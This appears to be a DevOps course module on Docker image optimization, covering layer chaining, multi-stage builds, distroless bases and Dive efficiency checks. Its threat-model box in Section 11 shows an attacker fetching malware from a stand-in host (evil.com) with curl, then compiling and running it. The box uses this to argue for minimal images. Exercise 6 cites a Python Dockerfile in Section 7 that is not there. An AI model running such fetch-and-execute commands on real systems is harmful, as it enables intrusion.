# Advanced Image Optimization, Layer Minimization, and Deep Inspection with Dive

```
Track: DevOps & Containerization
Module: 06-production
Prerequisites: 03-dockerfile/03-layers-and-caching.md, 03-dockerfile/04-multi-stage-builds.md, 03-dockerfile/08-base-image-choice.md
Difficulty: Advanced
Estimated Duration: 50 minutes
Target Docker Version: 27.x+
Last Validated: February 2025
```

---

## Table of Contents
1. [What & Why](#1-what--why)
2. [Core Concepts](#2-core-concepts)
3. [The Anatomy of Image Bloat](#3-the-anatomy-of-image-bloat)
4. [Layer Optimization Strategies](#4-layer-optimization-strategies)
5. [Deep Inspection and Efficiency Scoring with Dive](#5-deep-inspection-and-efficiency-scoring-with-dive)
6. [Syntax & Implementation Reference](#6-syntax--implementation-reference)
7. [Practical Implementation: Refactoring a 1.2GB Image to 45MB](#7-practical-implementation-refactoring-a-12gb-image-to-45mb)
8. [Production Best Practices & Antipatterns](#8-production-best-practices--antipatterns)
9. [Common Pitfalls & Troubleshooting](#9-common-pitfalls--troubleshooting)
10. [Performance Tuning & Resource Optimization](#10-performance-tuning--resource-optimization)
11. [Security Hardening & Threat Model](#11-security-hardening--threat-model)
12. [Architectural Comparison Table: Optimization Techniques](#12-architectural-comparison-table-optimization-techniques)
13. [Real-World Scenario Walkthrough](#13-real-world-scenario-walkthrough)
14. [Self-Assessment & Interview Questions](#14-self-assessment--interview-questions)
15. [Hands-on Practice Exercises](#15-hands-on-practice-exercises)
16. [Summary & Reference Cheat Sheet](#summary--reference-cheat-sheet)

---

## 1. What & Why

In production container systems, image size is not merely a cosmetic metric. It directly dictates the performance, stability, and security of your cloud infrastructure:
- **Autoscaling Latency**: In Kubernetes or AWS ECS Fargate, scaling from 5 to 50 pods during a flash-sale traffic spike requires pulling container images over the network. Pulling a 1.2GB image takes 15-30 seconds; pulling a 45MB image takes 400 milliseconds.
- **Network Transfer & Registry Storage Costs**: High-velocity CI/CD pipelines pushing unoptimized 1GB images across dozens of daily builds quickly incur thousands of dollars in cloud egress and registry storage fees.
- **Cold-Start Startup Time**: Serverless platforms (AWS Lambda Container Images, Google Cloud Run) experience severe cold-start latency when unpacking bloated tar layers.
- **CVE Attack Surface**: Every unneeded package (`curl`, `python2`, `git`, `tar`, `perl`) bundled in an image is an unneeded vulnerability scanning flag and an attack vector for container breakout.

---

## 2. Core Concepts

### Wasted Space Across Layers
Because Docker image layers are immutable read-only snapshots, **deleting or modifying a file in a later layer does not reduce image size**.
- If Layer 2 installs a 100MB tarball: `RUN wget http://.../archive.tar.gz`
- And Layer 3 extracts and deletes it: `RUN tar -xzf archive.tar.gz && rm archive.tar.gz`
- The 100MB archive remains **permanently recorded** in Layer 2, consuming 100MB of registry storage and network bandwidth!

### The Image Efficiency Score
Calculated by tools like **Dive**:
$$\text{Efficiency} = \frac{\text{Useful Unique Bytes}}{\text{Total Image Bytes}} \times 100\%$$
High-performing production images target an efficiency score of **98% to 100%**, with 0 bytes of duplicate or deleted files hidden across layers.

---

## 3. The Anatomy of Image Bloat

```
+-------------------------------------------------------------+
|               TYPICAL NAIVE IMAGE (1.2 GB)                  |
+-------------------------------------------------------------+
| Layer 1: Base OS (Ubuntu Full)                     | 80 MB  |
| Layer 2: Compilers (gcc, g++, make, rustc, npm)    | 450 MB |
| Layer 3: Package Manager Cache (/var/lib/apt/...)  | 120 MB |
| Layer 4: Source Code (.git repo, test fixtures)   | 250 MB |
| Layer 5: App Dependencies (devDependencies)        | 300 MB |
+-------------------------------------------------------------+
                               |
                               v (Refactoring via Multi-Stage + Pruning)
+-------------------------------------------------------------+
|            OPTIMIZED PRODUCTION IMAGE (42 MB)               |
+-------------------------------------------------------------+
| Layer 1: Distroless or Alpine Base                 | 15 MB  |
| Layer 2: Pruned Runtime Dependencies               | 22 MB  |
| Layer 3: Compiled Application Binary               | 5 MB   |
+-------------------------------------------------------------+
```

---

## 4. Layer Optimization Strategies

1. **Atomic Chain Execution**:
   Always combine package updates, package installations, and cache purges into a single `RUN` instruction:
   ```dockerfile
   RUN apt-get update && apt-get install -y --no-install-recommends \
       ca-certificates \
    && rm -rf /var/lib/apt/lists/*
   ```
2. **Order by Change Frequency (Volatility)**:
   Place the slowest-changing instructions at the top (base image, system libraries) and fast-changing instructions at the bottom (application code).
3. **Multi-Stage Build Segregation**:
   Use builder stages for compilation (`tsc`, `mvn`, `cargo`, `go build`) and copy only the compiled static binaries or production modules to the runtime stage.
4. **Binary Symbol Stripping**:
   Pass `-ldflags="-s -w"` to Go, or execute `strip --strip-unneeded` on C/C++/Rust binaries to remove debug symbols and symbol tables, slashing binary size by 40-70%.

---

## 5. Deep Inspection and Efficiency Scoring with Dive

**Dive** (`wagoodman/dive`) is the industry-standard tool for inspecting Docker images. It provides:
- A layer-by-layer terminal UI showing file additions, modifications, and deletions.
- Detection of wasted space (duplicate files across layers).
- Automated CI integration to break builds if efficiency drops below a set threshold.

```bash
# Analyze any local or registry image interactively
dive my-image:latest

# Run in CI mode: Fail if efficiency drops below 95%
dive my-image:latest --ci --lowestEfficiency=0.95
```

### Dive Terminal Interface Layout:

```
+----------------------------------+----------------------------------+
| Layers (Layer Stack & Size)      | Current Layer Contents           |
|----------------------------------+----------------------------------|
| Cmp Tag  Size  Command           | ├── app/                         |
|   1.2 MB FROM alpine:3.21        | │   ├── dist/ (Added: 5MB)       |
|   15 MB  RUN npm ci --omit=dev   | │   └── node_modules/ (22MB)     |
|   5.2 MB COPY dist ./dist        | ├── etc/                         |
|                                  | └── var/ (Unchanged)             |
+----------------------------------+----------------------------------+
| Image Details                    | Efficiency Metrics               |
| Total Size: 21.4 MB              | Image Efficiency: 99 %           |
| Potential Wasted Space: 0 B      | Wasted Space: 0 B                |
+----------------------------------+----------------------------------+
```

---

## 6. Syntax & Implementation Reference

### `.dockerignore` for Build Context Optimization

```text
# Exclude Git metadata
.git
.gitignore

# Exclude local dependency directories
node_modules/
.venv/
vendor/

# Exclude build output artifacts
dist/
build/
target/
*.pyc
__pycache__/

# Exclude secrets and developer configs
.env*
*.pem
*.key
.DS_Store
.idea/
.vscode/

# Exclude tests and documentation
tests/
spec/
*.md
docs/
```

---

## 7. Practical Implementation: Refactoring a 1.2GB Image to 45MB

### The Flawed 1.2GB Dockerfile
```dockerfile
# ❌ ANTI-PATTERN: Produces 1.2GB Image with high CVE count
FROM ubuntu:24.04
RUN apt-get update
RUN apt-get install -y nodejs npm git
COPY . /app
WORKDIR /app
RUN npm install
RUN npm run build
CMD ["node", "dist/server.js"]
```

### The Refactored 45MB Enterprise Dockerfile
```dockerfile
# syntax=docker/dockerfile:1.7

# -------------------------------------------------------------
# Stage 1: Build & Prune (Disposable)
# -------------------------------------------------------------
FROM node:22-bookworm-slim AS builder

WORKDIR /app

# Cache dependency manifests
COPY package*.json tsconfig.json ./

# Install full dependencies (including devDependencies) using cache mounts
RUN --mount=type=cache,target=/root/.npm \
    npm ci

# Copy source code and compile
COPY src/ ./src/
RUN npm run build

# Prune devDependencies to leave only production modules
RUN npm prune --omit=dev

# -------------------------------------------------------------
# Stage 2: Distroless Production Runtime
# -------------------------------------------------------------
FROM gcr.io/distroless/nodejs22-debian12:nonroot AS runtime

WORKDIR /app

# Copy production artifacts exclusively with unprivileged ownership
COPY --from=builder --chown=nonroot:nonroot /app/package.json ./
COPY --from=builder --chown=nonroot:nonroot /app/node_modules ./node_modules
COPY --from=builder --chown=nonroot:nonroot /app/dist ./dist

ENV NODE_ENV=production \
    PORT=3000

USER nonroot
EXPOSE 3000

CMD ["dist/server.js"]
```

### Metrics Comparison
- **Original Size**: 1,240 MB
- **Refactored Size**: **45.2 MB** (96.3% reduction!)
- **Known CVEs**: Dropped from 84 to **0**.
- **Cold Pull Latency**: Dropped from 18s to **600ms**.

---

## 8. Production Best Practices & Antipatterns

### Best Practices
- **Run Dive in CI Pull Request Checks**: Enforce `--lowestEfficiency=0.95` to block PRs that introduce image bloat.
- **Pass `--no-install-recommends` on Debian/Ubuntu**: Avoid pulling in hundreds of megabytes of optional manpages, documentation, and sound drivers.
- **Strip Compiled Binaries**: Run `strip` on Go/Rust/C++ binaries to eliminate symbols.
- **Prune DevDependencies Before Final Copy**: In Node.js, run `npm prune --omit=dev` before copying `node_modules` to the final stage.

### Anti-Patterns
- **Deleting Files in Subsequent `RUN` Commands**: `RUN apt-get update` followed by `RUN rm -rf /var/lib/apt/lists/*` in a later command fails to reclaim space.
- **Copying the Entire Directory (`COPY . .`) Before Manifests**: Invalidates dependency cache layers on every code edit.
- **Leaving Package Manager Cache in Final Images**: Omitting `rm -rf /var/lib/apt/lists/*` or `--no-cache` in Alpine wastes 30-100MB per image.

---

## 9. Common Pitfalls & Troubleshooting

| Symptom | Root Cause | Diagnosis Command | Permanent Fix |
|:---|:---|:---|:---|
| Dive reports low efficiency score (< 80%) | Large files downloaded in one layer and deleted in a later layer | Run `dive <image>` and press `Tab` to inspect layers | Combine download, extract, and delete into a single `RUN` command. |
| Node.js container fails with `Cannot find module 'typescript'` | Pruned `devDependencies` before running `npm run build` | Inspect build logs | Run build step first, then execute `npm prune --omit=dev`. |
| Go binary larger than 50MB | Debug symbols and symbol tables included in compiled binary | Run `file <binary>` | Pass `-ldflags="-s -w"` to `go build`. |
| Image build takes 10 minutes to send context to daemon | Missing `.dockerignore` file; sending `node_modules` or `.git` over socket | Watch initial `Sending build context to Docker daemon` output | Add comprehensive `.dockerignore` excluding `.git` and dependencies. |
| Alpine binary fails to execute (`not found`) | Dynamic executable compiled against `glibc` placed into Alpine (`musl`) | `ldd <binary>` | Compile statically or use `debian-slim` base image. |
| Package install fails with `404 Not Found` in Alpine | Alpine deleted package index caches when run without `apk update` | Inspect `apk add` logs | Use `apk add --no-cache <packages>`. |

---

## 10. Performance Tuning & Resource Optimization

1. **eStargz for Lazy Pulling (CRANE / SOCI)**:
   In high-scale Kubernetes clusters, adopt **eStargz** (Extended Stargz) or **AWS SOCI** (Seekable OCI). This allows container runtimes to start executing containers immediately (in < 2 seconds) by downloading image chunks lazily on-demand as files are accessed, rather than waiting for the entire image tarball to download.
2. **Zstandard (Zstd) Layer Compression**:
   Docker 25+ supports compression with Zstandard instead of Gzip:
   ```bash
   docker buildx build --output type=image,compression=zstd,push=true -t my-app .
   ```
   Zstd decompresses up to 5x faster than gzip on modern multi-core servers.

---

## 11. Security Hardening & Threat Model

```
+--------------------------------------------------------------+
| ATTACK: Supply Chain Exploitation via Build Residue          |
+--------------------------------------------------------------+
| Naive image leaves compiler toolchain (gcc, git, pip, curl)  |
| inside the production container.                             |
| Attacker discovers Remote Code Execution (RCE) in web app.   |
|                                                              |
| WITH UNOPTIMIZED IMAGE:                                      |
| - Attacker runs: `curl evil.com/malware.c -o p.c`            |
| - Attacker runs: `gcc p.c -o p && ./p`                       |
| - OUTCOME: ROOTKIT COMPILED AND EXECUTED LOCALLY!            |
|                                                              |
| WITH DISTROLESS / MINIMAL IMAGE:                             |
| - NO COMPILER EXISTS (`gcc: not found`).                     |
| - NO DOWNLOAD TOOL EXISTS (`curl: not found`).               |
| - NO SHELL EXISTS (`/bin/sh: not found`).                    |
| - OUTCOME: ATTACK CHAIN COMPLETELY BROKEN!                  |
+--------------------------------------------------------------+
```

---

## 12. Architectural Comparison Table: Optimization Techniques

| Optimization Technique | Size Impact | Security Impact | Implementation Effort |
|:---|:---|:---|:---|
| **Multi-Stage Builds** | **Extreme (50-90% reduction)**| High (Removes build tools)| Low |
| **Minimal Base (Distroless/Alpine)**| **High (60-80% reduction)** | **Maximum (Drops shell/utils)**| Low to Moderate |
| **Atomic RUN Chaining** | Moderate (10-30% reduction) | Moderate (Removes caches) | Low |
| **Strict `.dockerignore`** | High (Reduces context upload)| High (Prevents secret leaks)| Low |
| **Binary Stripping (`-s -w`)** | Moderate (30-60% on binary) | Low | Low |
| **Lazy Pulling (SOCI / eStargz)**| Zero (Speed optimization) | Low | Moderate |

---

## 13. Real-World Scenario Walkthrough

### Scenario: Slashing $4,000/Month in AWS ECR Egress and Fargate Pull Latency

#### The Problem
A SaaS company running 200 microservices on AWS ECS Fargate noticed:
- Fargate task startup latency averaged **42 seconds**, making autoscaling incapable of handling bursty traffic surges.
- AWS bill showed $4,200/month in ECR data transfer and S3 storage costs.
- Vulnerability scans surfaced 1,400+ CVEs across images.

#### The Investigation
Using Dive on their core Java Spring Boot images revealed:
- Each image weighed **880MB**.
- The full JDK (`eclipse-temurin:21-jdk`) was used instead of JRE.
- Maven cache (`.m2/repository`) was accidentally committed into an intermediate image layer (320MB of wasted space!).

#### The Remediation
1. Refactored to multi-stage builds:
   - Stage 1: Build JAR using `maven:3.9-eclipse-temurin-21-alpine` with cache mount.
   - Stage 2: Extract Spring Boot `layertools`.
   - Stage 3: Package into `eclipse-temurin:21-jre-alpine`.
2. Final image size dropped from **880MB** to **148MB**.
3. Autoscaling pull latency dropped from 42s to **3.8s**.
4. Monthly ECR bandwidth costs dropped by **82%**.

---

## 14. Self-Assessment & Interview Questions

<details>
<summary><strong>1. Why doesn't running `RUN rm -rf /tmp/large-file.tar.gz` in a separate Dockerfile instruction reduce the final image size?</strong></summary>

**Answer:**
Docker images are composed of immutable, read-only layers. When an instruction creates a file, that file is permanently written to that layer's tar archive. Running `rm` in a subsequent instruction merely creates a whiteout marker in the new layer that hides the file from the merged filesystem view; it does not delete the bytes from the underlying historical layer. To reclaim space, the creation, extraction, and deletion must occur in the exact same `RUN` command.
</details>

<details>
<summary><strong>2. How does Dive detect "wasted space" in an image?</strong></summary>

**Answer:**
Dive analyzes the underlying tar archive of every layer in the image and tracks file modifications. If a file is added in an earlier layer and then modified, overwritten, or deleted in a later layer, Dive flags those duplicated or hidden bytes as "wasted space" and calculates an overall Image Efficiency percentage.
</details>

<details>
<summary><strong>3. What compiler flags can be used to minimize Go binary sizes inside Docker images?</strong></summary>

**Answer:**
`-ldflags="-s -w"`:
- `-s`: Disables the generation of the symbol table.
- `-w`: Disables DWARF debugging information.
Combining these flags typically reduces Go binary sizes by 40% to 60% without affecting runtime performance.
</details>

<details>
<summary><strong>4. Why is `--no-install-recommends` essential when installing packages via `apt-get`?</strong></summary>

**Answer:**
By default, Debian and Ubuntu `apt-get` installs not only the requested package, but also all "recommended" packages (which can include graphical libraries, sound engines, manual pages, and documentation). Adding `--no-install-recommends` restricts installation strictly to mandatory dependencies, saving tens to hundreds of megabytes per image.
</details>

<details>
<summary><strong>5. What is the difference between image size on disk and compressed transfer size over the network?</strong></summary>

**Answer:**
When an image is pushed to or pulled from a registry, Docker compresses each layer using gzip or zstd. The transfer size is the compressed network payload (often 30-50% of uncompressed size). The size shown in `docker images` is the uncompressed footprint unpacked onto the host's local filesystem.
</details>

<details>
<summary><strong>6. How does lazy pulling (eStargz / SOCI) optimize container startup?</strong></summary>

**Answer:**
Standard container runtimes must download and unpack 100% of an image's layers before the container can start executing. Lazy pulling formats images with indexing that allows the runtime to mount the image immediately and stream only the specific individual files requested by the application during startup, reducing cold-start launch times from 30+ seconds to under 2 seconds.
</details>

<details>
<summary><strong>7. Why should `.dockerignore` always exclude `.git`?</strong></summary>

**Answer:**
The `.git` directory contains the complete commit history, packfiles, and objects of the repository, which can weigh hundreds of megabytes or gigabytes. Copying `.git` into the build context slows down context transfer over the Docker socket, busts cache layers on every commit, and risks leaking historical credentials in published images.
</details>

<details>
<summary><strong>8. What is the command to run Dive non-interactively in a CI pipeline to enforce a 95% efficiency threshold?</strong></summary>

**Answer:**
`dive <image_name> --ci --lowestEfficiency=0.95`
If the image efficiency score falls below 95%, Dive exits with a non-zero exit code, automatically failing the CI build.
</details>

---

## 15. Hands-on Practice Exercises

<details>
<summary><strong>Exercise 1: Inspecting an Image with Dive</strong></summary>

**Goal:** Run Dive on an image to view layer-by-layer wasted space.

**Step-by-step Solution:**
1. Pull test image: `docker pull node:22-alpine`
2. Run Dive via Docker container:
   ```bash
   docker run --rm -it \
     -v /var/run/docker.sock:/var/run/docker.sock \
     wagoodman/dive:latest node:22-alpine
   ```
3. Use `Tab` to navigate between Layer list and File hierarchy. Press `Ctrl+U` to filter by modified/wasted files.
</details>

<details>
<summary><strong>Exercise 2: Measuring Wasted Space from Multi-Command File Creation and Deletion</strong></summary>

**Goal:** Prove that deleting a file in a later layer preserves its size in history.

**Step-by-step Solution:**
1. Create `Dockerfile`:
   ```dockerfile
   FROM alpine:3.21
   RUN dd if=/dev/zero of=/tmp/bigfile.bin bs=1M count=50
   RUN rm /tmp/bigfile.bin
   ```
2. Build image: `docker build -t waste-demo .`
3. Inspect layers: `docker history waste-demo`
4. Notice the 50MB layer remains in image history despite the file being deleted!
</details>

<details>
<summary><strong>Exercise 3: Stripping Go Binary Symbols</strong></summary>

**Goal:** Compare Go binary sizes with and without `-ldflags="-s -w"`.

**Step-by-step Solution:**
1. Compile with debug symbols: `go build -o standard.bin main.go`
2. Compile stripped: `go build -ldflags="-s -w" -o stripped.bin main.go`
3. Compare sizes: `ls -lh *.bin` (Notice ~50% size reduction).
</details>

<details>
<summary><strong>Exercise 4: Pruning Node.js DevDependencies</strong></summary>

**Goal:** Measure `node_modules` size before and after `npm prune --omit=dev`.

**Step-by-step Solution:**
1. Measure dev size: `du -sh node_modules`
2. Run prune: `npm prune --omit=dev`
3. Re-measure size: `du -sh node_modules` (Observe elimination of test/compiler libs).
</details>

<details>
<summary><strong>Exercise 5: Automating Dive in CI with Pass/Fail Threshold</strong></summary>

**Goal:** Run Dive with automated threshold validation.

**Step-by-step Solution:**
1. Execute:
   ```bash
   docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
     wagoodman/dive:latest --ci --lowestEfficiency=0.90 alpine:3.21
   ```
2. Verify output displays `PASS` and exit code is 0.
</details>

<details>
<summary><strong>Exercise 6: Authoring an Optimized Multi-Stage Python Image</strong></summary>

**Goal:** Build a Python FastAPI container using virtualenv builder pattern and measure final image size (< 120MB).

**Step-by-step Solution:**
1. Author multi-stage Dockerfile from Section 7.
2. Build and verify size: `docker images | grep fastapi`.
</details>

---

## 16. Summary & Reference Cheat Sheet

### Top 6 Image Optimization Directives
1. **Multi-Stage Builds**: Builder stage compiles; runtime stage ships.
2. **Atomic RUN**: `apt-get update && apt-get install -y --no-install-recommends ... && rm -rf /var/lib/apt/lists/*`.
3. **Strip Binaries**: Pass `-ldflags="-s -w"` to Go / Rust.
4. **Strict `.dockerignore`**: Exclude `.git`, `node_modules`, `tests`.
5. **Dive in CI**: `dive <image> --ci --lowestEfficiency=0.95`.
6. **Distroless Runtime**: Eliminate package managers, compilers, and shells.

---

[← Previous: 01-environments-and-secrets.md](01-environments-and-secrets.md) | [Next: 03-docker-in-ci.md →](03-docker-in-ci.md)
